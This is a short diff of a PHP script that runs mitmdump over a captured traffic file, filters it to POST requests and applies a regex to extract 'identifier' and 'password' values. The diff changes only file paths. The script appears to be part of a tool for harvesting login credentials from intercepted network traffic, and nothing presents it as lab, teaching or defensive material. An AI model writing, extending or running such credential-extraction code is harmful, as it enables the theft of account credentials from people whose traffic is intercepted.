@@ -1,9 +1,9 @@
 <?php
 
-exec("~/mitmdump  -nr /var/www/html/The_Girl/tcore/mitmdump -w /var/www/html/The_Girl/filtered \"~m post\"");
+exec("~/mitmdump -nr /var/www/html/The_Girl/tcore/mitmdump -w /var/www/html/The_Girl/tcore/filtered \"~m post\"");
 
 
-$str = file_get_contents("/var/www/html/The_Girl/filtered");
+$str = file_get_contents("/var/www/html/The_Girl/tcore/filtered");
 
 $re = '/&identifier=(.*)&password=(.*)&/';
 
